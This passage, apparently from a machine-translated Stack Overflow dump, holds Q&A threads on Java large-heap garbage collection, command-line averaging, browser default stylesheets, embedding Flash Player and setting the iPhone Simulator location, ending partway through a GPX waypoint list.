CMS 和 G1 的问题在于，Java 堆内存在某些时候必须被压缩，并且这两个垃圾收集器都会停止世界/STW（即暂停应用程序）来执行压缩。因此，尽管 CMS 和 G1 可以推出 STW 暂停，但它们并不能消除它们。然而，Azul 的 C4 确实完全消除了 STW 暂停，这就是 Zing 即使对于巨大的堆大小也有如此低的 GC 暂停的原因。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2008-10-18T01:56:59.337

We have an application that we allocate 12-16 Gb for but it really only reaches 8-10 during normal operation. We use the Sun JVM (tried IBMs and it was a bit of a disaster but that just might have been ignorance on our part...I have friends that swear by it--that work at IBM). As long as you give your app breathing room, the JVM can handle large heap sizes with not too much GC. Plenty of 'extra' memory is key.
Linux is almost always more stable than Windows and when it is not stable it is a hell of a lot easier to figure out why. Solaris is rock solid as well and you get DTrace too :) With these kind of loads, why on earth would you be using Vista or XP? You are just asking for trouble. We don't do anything fancy with the GC params. We do set the minimum allocation to be equal to the maximum so it is not constantly trying to resize but that is it.

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2010-12-02T02:21:00.287

我分别使用 Sun 1.6 JVM 的 64 位版本（显然）在 Linux 和 Solaris 下的两个不同应用程序上使用了超过 60 GB 的堆大小。

我从来没有遇到过基于 Linux 的应用程序的垃圾收集问题，除非在堆大小限制附近推高。为了避免该场景固有的抖动问题（花费太多时间进行垃圾收集），我简单地优化了整个程序的内存使用量，使峰值使用量比 64 GB 堆大小限制低 5-10%。

然而，在 Solaris 下运行不同的应用程序时，我遇到了严重的垃圾收集问题，因此需要进行大量调整。这主要包括三个步骤：

1.  通过 -XX:+UseParallelGC -XX:+UseParallelOldGC JVM 选项启用/强制使用并行垃圾收集器，以及通过 -XX:ParallelGCThreads 选项控制使用的 GC 线程数。有关详细信息，请参阅“ [Java SE 6 HotSpot 虚拟机垃圾收集调整](http://www.oracle.com/technetwork/java/javase/gc-tuning-6-140523.html)”。

2.  在不再需要局部变量后，将它们广泛且看似荒谬的设置为“null”。其中大多数是超出范围后应该有资格进行垃圾收集的变量，并且它们不是内存泄漏情况，因为没有复制引用。然而，出于某种原因，这种用于帮助垃圾收集的“手持”策略对于所讨论的 Solaris 平台下的该应用程序来说是莫名其妙的必要性。

3.  在大量临时对象分配之后，在关键代码部分中选择性地使用 System.gc() 方法调用。我知道反对使用这些调用的标准警告，以及它们通常应该是不必要的论点，但我发现它们对于在运行这个内存密集型应用程序时驯服垃圾收集至关重要。

上述三个步骤使得在大约 60 GB 的堆使用量下保持该应用程序的可控性和高效运行成为可能，而不是失控到 128 GB 的堆大小限制。尤其是并行垃圾收集器非常有用，因为当有很多对象时，主要垃圾收集周期是昂贵的，即主要垃圾收集所需的时间是堆中对象数量的函数。

我无法评论这种规模的其他特定于平台的问题，我也没有使用过非 Sun (Oracle) JVM。

* * *

## 回答 #5

> 赞同：8
> 
> 时间：2008-10-18T20:08:56.523

对于像 Sun 的 Hotspot 这样体面的 JVM 实现，12Gb 应该没有问题。我建议您在使用 SUN VM 时使用并发标记和扫描收集器 (-XX:+UseConcMarkSweepGC)。如果在 GC 期间所有线程都停止，您可能会面临漫长的“停止世界”阶段。

操作系统不应该对 GC 性能产生很大影响。

您当然需要 64 位操作系统和具有足够物理 RAM 的机器。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2008-10-18T02:09:56.470

I recommend also considering taking a heap dump and see where memory usage can be improved in your app and analyzing the dump in something such as [Eclipse's MAT](http://www.eclipse.org/mat/) . There are a few articles on the MAT page on getting started in looking for memory leaks. You can use jmap to obtain the dump with something such as ...

```
jmap -heap:format=b pid 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2014-05-01T23:00:04.297

如上所述，如果您有一个非交互式程序，默认（压缩）垃圾收集器 (GC) 应该可以正常工作。如果您有一个交互式程序，并且您 (1) 分配内存的速度不会超过 GC 可以跟上的速度，并且 (2) 不要创建太大（相对于总数）的临时对象（或对象集合）最大 JVM 内存）供 GC 解决，那么 CMS 适合您。

如果您有一个交互式程序，而 GC 没有足够的喘息空间，您就会遇到麻烦。不管你有多少内存都是如此，但你拥有的内存越多，情况就越糟糕。那是因为当你的内存太少时，CMS 将耗尽内存，而压缩 GC（包括 G1）将暂停所有内容，直到所有内存都被检查为垃圾。您拥有的内存越多，这种停止世界的暂停就越大。相信我，您不希望您的 servlet 暂停超过一分钟。我写[了一个关于 G1 中这些暂停的详细 StackOverflow 答案。](https://stackoverflow.com/questions/2254041/java-g1-garbage-collection-in-production/3963458#3963458)

从那以后，我的公司改用 Azul Zing。它仍然无法处理您的应用程序确实需要比您拥有的更多内存的情况，但直到那一刻它运行得像梦一样。

但是，当然，Zing 不是免费的，它的特殊酱汁是专利的。如果您的时间远多于金钱，请尝试重写您的应用程序以使用 JVM 集群。

Oracle 正在[为数 GB 堆开发高性能 GC。](http://openjdk.java.net/jeps/189)但是，截至今天，这不是一个选择。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-05-14T16:22:25.387

几年前，我比较了 JRockit 和 Sun JVM 的 12G 堆。JRockit 获胜，Linux 巨页支持使我们的测试运行速度提高了 20%。YMMV 作为我们的测试非常占用处理器/内存，并且主要是单线程的。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2008-10-18T02:57:05.983

If you switch to 64-bit you will use more memory. Pointers become 8 bytes instead of 4\. If you are creating lots of objects this can be noticeable seeing as every object is a reference (pointer).

I have recently allocated 15GB of memory in Java using the Sun 1.6 JVM with no problems. Though it is all only allocated once. Not much more memory is allocated or released after the initial amount. This was on a Linux but I imagine the Sun JVM will work just as well on 64-bit Windows.

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-10-19T01:50:14.773

这是来自 Java 冠军之一的关于 gc 的文章——http: [//kirk.blog-city.com/is_your_concurrent_collector_failing_you.htm](http://kirk.blog-city.com/is_your_concurrent_collector_failing_you.htm)

Kirk，作者写道“把你的 GC 日志发给我

我目前有兴趣研究 Sun JVM 生成的 GC 日志。由于这些日志不包含业务相关信息，因此应该可以减轻对保护专有信息的担忧。我只要求您在日志中提及操作系统、JRE 的完整版本信息以及您设置的任何与堆/gc 相关的命令行开关。我还想知道您是否正在运行 Grails/Groovy、JRuby、Scala 或 Java 以外的其他东西或与 Java 一起运行的东西。最好的设置是-Xloggc:。请注意，此日志在达到您的操作系统大小限制时不会翻转。如果我发现任何有趣的东西，我很乐意给你一个非常快速的概要作为回报。"

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-28T19:05:07.313

您应该尝试对您的应用运行 visualgc。它是一个堆可视化工具，是 jvmstat 下载的一部分，位于[http://java.sun.com/performance/jvmstat/](http://java.sun.com/performance/jvmstat/)

这比阅读 GC 日志要容易得多。

它可以快速帮助您了解堆的各个部分（代）是如何工作的。虽然您的总堆可能是 10GB，但堆的各个部分会小得多。堆的 Eden 部分中的 GC 相对便宜，而老年代中的完整 GC 成本较高。调整堆大小以使 Eden 很大并且老年代几乎不会被触及是一个不错的策略。这可能会导致一个非常大的整体堆，但是，如果 JVM 从不接触该页面，它只是一个虚拟页面，并且不必占用 RAM。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-10-18T04:37:58.263

Sun 关于 Java 6 的文章可以帮助您：[https ://www.oracle.com/java/technologies/javase/troubleshooting-javase.html](https://www.oracle.com/java/technologies/javase/troubleshooting-javase.html)

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2008-10-18T02:51:17.073

The max memory that XP can address is 4 gig([here](http://www.microsoft.com/whdc/system/platform/server/PAE/PAEmem.mspx)). So you may not want to use XP for that(use a 64 bit os).

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-10-18T04:23:35.390

尽管 itanium 不是一个受欢迎的目的地，但 sun 已经拥有一个 itanium 64 位 jvm 有一段时间了。solaris 和 linux 64 位 JVM 应该是您应该追求的。
一些问题

1）您的应用程序稳定吗？
2) 您是否已经在 32 位 JVM 中测试过该应用程序？
3) 可以在同一个盒子上运行多个 JVM 吗？

我预计 Windows 的 64 位操作系统会在大约一年左右的时间内变得稳定，但在那之前，solaris/linux 可能是更好的选择。

# command-line - 从命令行获取一组数字的平均值的最快方法是什么？

> ID：214363
> 
> 赞同：12
> 
> 时间：2008-10-18T01:36:12.420
> 
> 标签：command-line, statistics, average, mean

使用您希望在 nix 系统上找到的任何工具（事实上，如果您愿意，msdos 也可以），假设您有一个计算一组数字的平均值的最简单/最快的方法是什么流或文件中的每行？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2008-10-18T02:26:41.367

```
awk ' { n += $1 }; END { print n / NR }' 
```

这会累积 中的总和`n`，然后除以项目数（`NR`= 记录数）。

适用于整数或实数。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2008-10-18T02:05:49.800

awk

```
awk '{total += $1; count++ } END {print total/count}' 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-10-18T01:48:31.427

在 UNIX 上使用[Num-Utils](http://suso.suso.org/programs/num-utils/)：

```
average 1 2 3 4 5 6 7 8 9 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-18T01:40:58.603

```
perl -e 'while (<>) { $sum += $_; $count++ } print $sum / $count, "\n"'; 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-09-04T15:16:04.380

使用“st”（[https://github.com/nferraz/st](https://github.com/nferraz/st)）：

```
$ st numbers.txt
N      min   max    sum    mean  sd
10.00  1.00  10.00  55.00  5.50  3.03 
```

指定一个选项以查看单个统计信息：

```
$ st numbers.txt --mean
5.5 
```

（免责声明：我写了这个工具:)）

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-18T13:11:30.567

在 Powershell 中，它将是

```
get-content .\meanNumbers.txt | measure-object -average 
```

当然，这是冗长的语法。如果您使用别名键入它，

```
gc .\meanNumbers.txt | measure-object -a 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-18T01:40:44.453

珀尔。

```
@a = <STDIN>;

for($i = 0; $i < #@a; $i++)
{
   $sum += $a[i];
}

print $a[i]/#@a; 
```

警告 Emptor：我的语法可能有点奇怪。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-02-08T20:55:41.350

红宝石一班轮

```
cat numbers.txt | ruby -ne 'BEGIN{$sum=0}; $sum=$sum+$_.to_f; END{puts $sum/$.}' 
```

[来源](http://blog.sam-we.com/docs/avgbash/)

# editor - What options are available for cross platform resource bundle editors?

> ID：214377
> 
> 赞同：1
> 
> 时间：2008-10-18T01:47:00.260
> 
> 标签：editor, internationalization

We're releasing a new set of resource bundles for a large open source project, and I'd like to make some good recommendations for cross platform resource bundle editors to translators.

The only useful candidates I can find include:

*   [RBManager](http://www.icu-project.org/download/rbmanager.html)
*   [Eclipse ResourceBundle Editor](http://sourceforge.net/projects/eclipse-rbe/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-11-10T10:44:41.247

过去，我刚刚创建了 OpenOffice XSL 过滤器来读取/写入我的资源文件，而不是依赖外部资源文件编辑器，因为我发现大多数翻译人员熟悉电子表格但不熟悉资源文件。我在我的帖子中写了更多关于它的内容：[管理字符串翻译过程](https://stackoverflow.com/questions/191066/how-do-you-manage-the-string-translation-process#277508)。

# html - How can I locate the default style sheet for a browser?

> ID：214378
> 
> 赞同：34
> 
> 时间：2008-10-18T01:47:04.770
> 
> 标签：html, browser, stylesheet, default

I would like to see the specific style elements that are used in the default stylesheet for the various browsers. Do the browsers have an actual file based stylesheetss that I locate on my system and read? If so, what are the default locations of those files? If not, where I can find this information?

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2008-10-18T15:40:11.560

*   [来自 WebKit 源代码库](http://trac.webkit.org/browser/trunk/Source/WebCore/css/html.css)
*   [几大浏览器的非官方Grid](http://css-class.com/test/css/defaults/UA-style-sheet-defaults.htm)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-18T03:32:34.620

在 Firefox 上，在同一目录中查找 res/html.css 和其他 CSS 文件。

或者只是`resource://gre-resources/forms.css`在 Firefox 中打开。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2018-07-10T12:12:30.513

检查浏览器中的 html 元素并在右下角找到 css 规则。您将找到用户代理样式或浏览器样式（在 Firefox 中命名为 html.css）。复制文件位置并在选项卡中打开它 - 你去。

**位置默认样式表**

> 火狐 - 资源：//gre-resources/html.css
> 铬 - [https://chromium.googlesource.com/chromium/blink/+/master/Source/core/css/html.css](https://chromium.googlesource.com/chromium/blink/+/master/Source/core/css/html.css)

你可以为别人找。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-01T21:06:41.193

soypunk 已经[提到](https://stackoverflow.com/questions/214378/how-can-i-locate-the-default-style-sheet-for-a-browser#215174)了 WebKit 的 UA 样式表。

Gecko 的 UA 样式表（在[标准模式下](http://hsivonen.iki.fi/doctype/)）由[ua.css](http://mxr.mozilla.org/mozilla-central/source/layout/style/ua.css)、[forms.css](http://mxr.mozilla.org/mozilla-central/source/layout/style/forms.css)和[html.css 组成](http://mxr.mozilla.org/mozilla-central/source/layout/style/html.css)。（另见[quirk.css](http://mxr.mozilla.org/mozilla-central/source/layout/style/quirk.css)以了解 quirks 模式。）

Opera 没有 .css 文件形式的 UA 样式表。（前面提到的user.css不是UA样式表，是用户样式表。）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-02-26T21:15:55.693

在 Mozilla Firefox 中，将此链接输入到地址字段： `jar:file:///Applications/Firefox.app/Contents/Resources/omni.ja!/chrome/toolkit/res/`

在这里，您将找到 Firefox 的所有默认样式。计数器、表单、全屏、通用 html、数学、数字、纯文本、怪癖、ua 和视图源有单独的样式表。

* * *

有关用户代理样式表的更完整列表，[请参见此处](http://meiert.com/en/blog/20070922/user-agent-style-sheets/)。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-18T02:04:52.237

Some do some don't. (on a slightly different subject) I would recommend using a reset stylesheet.

[http://developer.yahoo.com/yui/reset/](http://developer.yahoo.com/yui/reset/)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-18T02:32:39.450

In Safari, the Web Inspector will show you the CSS cascade for any element, including properties that were overridden, all the way back to the default CSS. Unfortunately, it won't show you the filename for that default CSS, but it will show you what properties were reset. Hopefully that helps a bit.

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-10-18T03:58:46.220

这可能与您问题的核心无关，但如果我猜对了您为什么需要此信息，您可能需要查看[browsershots.org](http://browsershots.org/)。

> Browsershots 可以在不同的浏览器中截取您的网页设计。

换句话说，您可以在许多不同的浏览器、浏览器版本和平台上看到您的网站的外观。

* * *

## 回答 #9

> 赞同：-2
> 
> 时间：2008-10-18T09:23:54.970

The default stylesheet is generally not available. I recommend starting your own stylesheet with a "reset styles" part, or including reset styles in a style sheet you load first. Eg.

```
<link rel="stylesheet" type="text/css" media="screen" href="/stylesheets/reset.css"></link>
<link rel="stylesheet" type="text/css" media="screen" href="/stylesheets/general.css"></link> 
```

Eric Meyer ("the" Eric, just [google Eric](http://www.google.com/search?q=eric)) offers a battle tested and widely used reset style sheet here: [http://meyerweb.com/eric/thoughts/2007/05/01/reset-reloaded/](http://meyerweb.com/eric/thoughts/2007/05/01/reset-reloaded/)

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2008-10-18T18:50:04.280

在 Opera 中，在 OSX 上，文件位于`/Applications/Opera.app/Contents/Resources/Styles/user.css`

# asp.net - 在 ASP.Net 移动 Web 应用程序中存储视图状态的最佳方法是什么？

> ID：214379
> 
> 赞同：0
> 
> 时间：2008-10-18T01:47:41.180
> 
> 标签：asp.net, windows-mobile, mobile, viewstate

我很好奇您发现哪些技术对于在移动网络浏览器中运行的 ASP.Net 应用程序（即带有 Windows Mobile 的 Treo 或 Blackberry Curve 网络浏览器）最适合存储和维护视图状态。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-18T05:15:00.653

如果您使用移动控件，视图状态实际上可以存储在会话中，因此它不会占用带宽。有关移动控件和维护状态的更多信息，请参阅此链接[http://msdn.microsoft.com/en-us/library/cteh3e77.aspx](http://msdn.microsoft.com/en-us/library/cteh3e77.aspx)。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-20T21:18:58.570

某些移动控件仍以旧手机可能不支持的方式存储设置。如果您的目标是旧手机，您应该将会话设置更改为无 cookie 或开始使用 HiddenVariables 集合（旧手机可以使用）。我们使用了隐藏变量，因为将整个网站更改为无 cookie 不是一种选择。但是，隐藏变量只能是字符串，因此您需要准备好将对象序列化为隐藏字段作为字符串，就像 viewstate 一样。

# c# - 在 C++ 或 Java 应用程序中嵌入 Flash Player？

> ID：214411
> 
> 赞同：8
> 
> 时间：2008-10-18T02:11:55.857
> 
> 标签：c#, java, c++, flash

我想将 Flash Player 直接嵌入到 C++ 或 Java 应用程序中。

我找到了一篇描述如何为 C# 执行此操作的文章：http: [//www.adobe.com/devnet/flash/articles/stock_history03.html](http://www.adobe.com/devnet/flash/articles/stock_history03.html)

不幸的是，我没有使用 C#、COM 或 ActiveX 的经验。我需要有人将这段代码翻译成 C++，允许我将 Flash Player 嵌入到 Win32 窗口中。最终，我想使用这些信息将 Flash 嵌入到 Java 应用程序中。

我正在寻找三个主要功能：

1.  能够播放 Flash 电影
2.  能够接收事件（例如鼠标点击）
3.  发送事件的能力

编辑：如果可能的话，我更喜欢开源解决方案。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-18T02:26:01.430

我不知道如何在 C++ 中嵌入 flash，但是 Christopher Deckers（[SWTSwing](http://swtswing.sf.net)名声）开发了一个有趣的 hack，允许它嵌入到 Java 中。[您可以在Javalobby 公告线程](http://www.javalobby.org/java/forums/t105291.html)中找到更多信息。

这是一个更新的链接：[https ://github.com/Chrriis/DJ-Native-Swing](https://github.com/Chrriis/DJ-Native-Swing)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-12T09:33:06.523

[不久前](https://stackoverflow.com/questions/643177/embedding-flash-within-a-custom-desktop-application-using-npapi/645701#645701)我也给出了同样的答案。查看 SWHX：

[http://haxe.org/com/libs/swhx](http://haxe.org/com/libs/swhx)

[http://code.google.com/p/screenweaver-hx/](http://code.google.com/p/screenweaver-hx/)

[http://code.google.com/p/screenweaver-hx/source/browse/trunk/src/np_host.c](http://code.google.com/p/screenweaver-hx/source/browse/trunk/src/np_host.c)

干杯!

胡安

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-12T09:43:34.800

如果它必须是开源的，我会考虑[Gnash](http://gnashdev.org)，一个开源闪存实现。
它适用于所有主要平台，支持大多数多媒体编解码器，并且应该可以通过[nsapi](http://www.gnu.org/software/gnash/manual/gnashref.html#plugincppapi)嵌入到应用程序中。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T02:28:39.757

如果您想使用商业解决方案，我建议您使用[Scaleform GFx](https://www.scaleform.com/products_gfx.php)。不过，它并不便宜，但它非常好。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-18T03:50:28.840

在窗口中创建 Flash 播放器的一种简单方法是：AtlAxCreateControlEx。

要接收和发送事件，您需要一个接收器：AtlAdvise。您还需要在 ActionScript（即 Flash）端定义接收事件的函数。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-02-17T09:25:18.320

您应该使用的是[Netscape Plugin API](https://wiki.mozilla.org/NPAPI)。它是原生的，所有优秀的浏览器都使用它来加载 Flash 播放器插件。虽然实际的 Flash 播放器不是开源的，但这个 API 是开源的。

如果您不打算在您的应用中发布 flashplayer 副本：

您的应用程序应在运行时检查 Flash 播放器，并在未找到时提醒用户（通常通过提供指向 Adob​​e 的链接来下载它）。Flashplayer 插件通常安装在`%AppData%\Mozilla\plugins`Windows 上。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-23T06:19:53.437

看看[FlashDX](http://code.google.com/p/flash-to-directx/)。它是开源和免费的。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2009-04-11T20:35:16.533

我个人没有尝试过这个，但是说​​如果是 SWT/Java，你可以在你的 SWT/Java 应用程序中嵌入 SWT 浏览器窗口，在浏览器视图中你可以放置带有 flash 内容的内容，然后通过 flash 电影与 Merapi 桥通信说爪哇。

# iphone - Set the location in iPhone Simulator

> ID：214416
> 
> 赞同：161
> 
> 时间：2008-10-18T02:15:57.190
> 
> 标签：iphone, ios-simulator, core-location

How can I set the location (as it's picked up in CoreLocation services) in the iPhone Simulator?

* * *

## 回答 #1

> 赞同：134
> 
> 时间：2011-11-17T22:46:32.727

从 iOS 5 开始，模拟器有一个可配置的位置。

在Debug菜单下，最后一项是“Location”；这为您提供了一个子菜单：

*   没有任何
*   自定义位置
*   苹果专卖店
*   苹果
*   城市自行车骑行
*   城市跑
*   高速公路驱动器

自定义位置允许您输入纬度/经度值。骑自行车、City Run 和 Freeway Drive 是对移动位置的模拟（当然是在库比蒂诺）。

当然，这对调试 iOS 4（或更早版本）没有任何帮助；但这是一个明确的改进！

* * *

## 回答 #2

> 赞同：89
> 
> 时间：2012-09-28T09:44:51.693

1.  在 iPhone 模拟器中运行项目
2.  在 TextEdit 文件中创建以下文件，例如将其称为 MyOffice。将扩展名设为 .gpx ![在此处输入图像描述](https://i.stack.imgur.com/aRh5p.png)

    `<?xml version="1.0"?> <gpx version="1.0" creator="MyName"> <wpt lat="53.936166" lon="27.565370"> <name>MyOffice</name> </wpt> </gpx>`

3.  在 Xcode 中的 Simulate 区域中选择`Add GPX File to Project...`![在此处输入图像描述](https://i.stack.imgur.com/9pZsA.png)

4.  将创建的文件从菜单添加到项目。
5.  现在您可以在模拟区域中看到您的位置：![在此处输入图像描述](https://i.stack.imgur.com/Vr2Rp.png)

* * *

## 回答 #3

> 赞同：48
> 
> 时间：2020-04-14T12:13:14.397

## XCode 11.3 及更早版本：

`Debug -> Location -> Custom Location`

[![在此处输入图像描述](https://i.stack.imgur.com/Bii85.png)](https://i.stack.imgur.com/Bii85.png)

## XCode 11.4+：

`Features -> Location -> Custom Location`

[![在此处输入图像描述](https://i.stack.imgur.com/KbYQG.png)](https://i.stack.imgur.com/KbYQG.png)

> 找出您拥有的 XCode 版本
> 
> ```
> $ /usr/bin/xcodebuild -version 
> ```

* * *

## 回答 #4

> 赞同：23
> 
> 时间：2015-07-06T05:07:46.410

在 iOS 模拟器菜单中，转到调试 -> 位置 -> 自定义位置。您可以在那里设置纬度和经度并相应地测试应用程序。这适用于 mapkit 和 CLLocationManager。

* * *

## 回答 #5

> 赞同：17
> 
> 时间：2008-10-18T02:51:25.870

In my delegate callback, I check to see if I'm running in a simulator (`#if TARGET_ IPHONE_SIMULATOR`) and if so, I supply my own, pre-looked-up, Lat/Long. To my knowledge, there's no other way.

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2020-03-30T17:28:59.723

您可以轻松地**将**任何所需**位置**从**macOS 地图应用程序**共享到**Xcode 模拟器**。

1.  像往常一样从 Xcode 在模拟器中运行应用程序。
2.  在 macOS 上打开地图应用程序（为方便起见，我通常会创建一个新的桌面，其中有模拟器和地图应用程序）。
3.  在地图 (macOS) 中，长按地图上的任意点，或搜索一个位置，让地图在您需要的地方画一个大头针。
4.  单击图钉，然后单击信息 (i) 图标（[见图](https://i.stack.imgur.com/wvGcI.jpg)）。
5.  在信息视图的右上角，单击共享图标。
6.  与模拟器共享位置（[见图](https://i.stack.imgur.com/ZSRu1.jpg)）。
7.  确认并享受:)

这使您可以快速测试某些位置，了解该位置的地理位置（例如，用于测试地理围栏），并在运行时决定下一步要去哪里（例如，用于调试和微调）。

*在 MacOS Catalina 10.15.4 和 Xcode 11.4 上对此进行了测试。*

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2012-02-10T12:06:24.220

在 iOS 5 之前，你可以在代码中做到这一点：

`@implementation`我在需要我的假标题和位置数据的类之前使用这个片段。

```
#if (TARGET_IPHONE_SIMULATOR)
@interface MyHeading : CLHeading
    -(CLLocationDirection) magneticHeading;
    -(CLLocationDirection) trueHeading;
@end

@implementation MyHeading
    -(CLLocationDirection) magneticHeading { return 90; }
    -(CLLocationDirection) trueHeading { return 91; }
@end

@implementation CLLocationManager (TemporaryLocationFix)
- (void)locationFix {
    CLLocation *location = [[CLLocation alloc] initWithLatitude:55.932 longitude:12.321];
    [[self delegate] locationManager:self didUpdateToLocation:location fromLocation:nil];

    id heading  = [[MyHeading alloc] init];
    [[self delegate] locationManager:self didUpdateHeading: heading];
}

-(void)startUpdatingHeading {
    [self performSelector:@selector(locationFix) withObject:nil afterDelay:0.1];
}

- (void)startUpdatingLocation {
    [self performSelector:@selector(locationFix) withObject:nil afterDelay:0.1];
}
@end
#endif 
```

在 iOS 5 之后，只需在您的项目中包含一个 GPX 文件，这样就可以持续更新 Hillerød.gpx 的位置：

```
<?xml version="1.0"?>
<gpx version="1.1" creator="Xcode"> 
    <wpt lat="55.93619760" lon="12.29131930"></wpt>
    <wpt lat="55.93625770" lon="12.29108330"></wpt>
    <wpt lat="55.93631780" lon="12.29078290"></wpt>
    <wpt lat="55.93642600" lon="12.29041810"></wpt>
    <wpt lat="55.93653420" lon="12.28998890"></wpt>
    <wpt lat="55.93660630" lon="12.28966710"></wpt>
    <wpt lat="55.93670240" lon="12.28936670"></wpt>
    <wpt lat="55.93677450" lon="12.28921650"></wpt>
    <wpt lat="55.93709900" lon="12.28945250"></wpt>
    <wpt lat="55.93747160" lon="12.28949540"></wpt>
    <wpt lat="55.93770000" lon="12.28966710"></wpt>
    <wpt lat="55.93785620" lon="12.28977440"></wpt>
    <wpt lat="55.93809660" lon="12.28988170"></wpt>
    <wpt lat="55.93832490" lon="12.28994600"></wpt>
    <wpt lat="55.93845710" lon="12.28996750"></wpt>
    <wpt lat="55.93856530" lon="12.29007480"></wpt>
    <wpt lat="55.93872150" lon="12.29013910"></wpt>
    <wpt lat="55.93886570" lon="12.28975290"></wpt>
    <wpt lat="55.93898590" lon="12.28955980"></wpt>
    <wpt lat="55.93910610" lon="12.28919500"></wpt>
    <wpt lat="55.93861330" lon="12.28883020"></wpt>
    <wpt lat="55.93845710" lon="12.28868000"></wpt>
    <wpt lat="55.93827680" lon="12.28850840"></wpt>
    <wpt lat="55.93809660" lon="12.28842250"></wpt>
    <wpt lat="55.93796440" lon="12.28831520"></wpt>
    <wpt lat="55.93780810" lon="12.28810070"></wpt>
    <wpt lat="55.93755570" lon="12.28790760"></wpt>
    <wpt lat="55.93739950" lon="12.28775730"></wpt>
    <wpt lat="55.93726730" lon="12.28767150"></wpt>
    <wpt lat="55.93707500" lon="12.28760710"></wpt>
    <wpt lat="55.93690670" lon="12.28734970"></wpt>
    <wpt lat="55.93675050" lon="12.28726380"></wpt>
    <wpt lat="55.93649810" lon="12.28713510"></wpt>
    <wpt lat="55.93625770" lon="12.28687760"></wpt>
    <wpt lat="55.93596930" lon="12.28679180"></wpt>
    <wpt lat="55.93587310" lon="12.28719940"></wpt>
    <wpt lat="55.93575290" lon="12.28752130"></wpt>
    <wpt lat="55.93564480" lon="12.28797190"></wpt>
    <wpt lat="55.93554860" lon="12.28833670"></wpt>
    <wpt lat="55.93550050" lon="12.28868000"></wpt>
    <wpt lat="55.93535630" lon="12.28900190"></wpt>
    <wpt lat="55.93515200" lon="12.28936670"></wpt>
    <wpt lat="55.93505580" lon="12.28958120"></wpt>
    <wpt lat="55.93481550" lon="12.29001040"></wpt>
    <wpt lat="55.93468320" lon="12.29033230"></wpt>
    <wpt lat="55.93452700" lon="12.29063270"></wpt>
    <wpt lat="55.93438280" lon="12.29095450"></wpt>
    <wpt lat="55.93425050" lon="12.29121200"></wpt>
    <wpt lat="55.93413040" lon="12.29140520"></wpt>
    <wpt lat="55.93401020" lon="12.29168410"></wpt>
    <wpt lat="55.93389000" lon="12.29189870"></wpt>
    <wpt lat="55.93372170" lon="12.29239220"></wpt>
    <wpt lat="55.93385390" lon="12.29258530"></wpt>
    <wpt lat="55.93409430" lon="12.29295010"></wpt>
    <wpt lat="55.93421450" lon="12.29320760"></wpt>
    <wpt lat="55.93433470" lon="12.29333630"></wpt>
    <wpt lat="55.93445490" lon="12.29350800"></wpt>
    <wpt lat="55.93463520" lon="12.29374400"></wpt>
    <wpt lat="55.93479140" lon="12.29410880"></wpt>
    <wpt lat="55.93491160" lon="12.29419460"></wpt>
    <wpt lat="55.93515200" lon="12.29458090"></wpt>
    <wpt lat="55.93545250" lon="12.29494570"></wpt>
    <wpt lat="55.93571690" lon="12.29505300"></wpt>
    <wpt lat="55.93593320" lon="12.29513880"></wpt>
    <wpt lat="55.93617360" lon="12.29522460"></wpt>
    <wpt lat="55.93622170" lon="12.29537480"></wpt>
    <wpt lat="55.93713510" lon="12.29505300"></wpt>
    <wpt lat="55.93776000" lon="12.29378700"></wpt>
    <wpt lat="55.93904600" lon="12.29531040"></wpt>
    <wpt lat="55.94004350" lon="12.29552500"></wpt>
    <wpt lat="55.94023570" lon="12.29561090"></wpt>
    <wpt lat="55.94019970" lon="12.29591130"></wpt>
    <wpt lat="55.94017560" lon="12.29629750"></wpt>
    <wpt lat="55.94017560" lon="12.29670520"></wpt>
    <wpt lat="55.94017560" lon="12.29713430"></wpt>
    <wpt lat="55.94019970" lon="12.29754200"></wpt>
    <wpt lat="55.94024780" lon="12.29816430"></wpt>
    <wpt lat="55.94051210" lon="12.29842180"></wpt>
    <wpt lat="55.94084860" lon="12.29820720"></wpt>
    <wpt lat="55.94105290" lon="12.29799270"></wpt>
    <wpt lat="55.94123320" lon="12.29777810"></wpt>
    <wpt lat="55.94140140" lon="12.29749910"></wpt>
    <wpt lat="55.94142550" lon="12.29726310"></wpt>
    <wpt lat="55.94147350" lon="12.29687690"></wpt>
    <wpt lat="55.94155760" lon="12.29619020"></wpt>
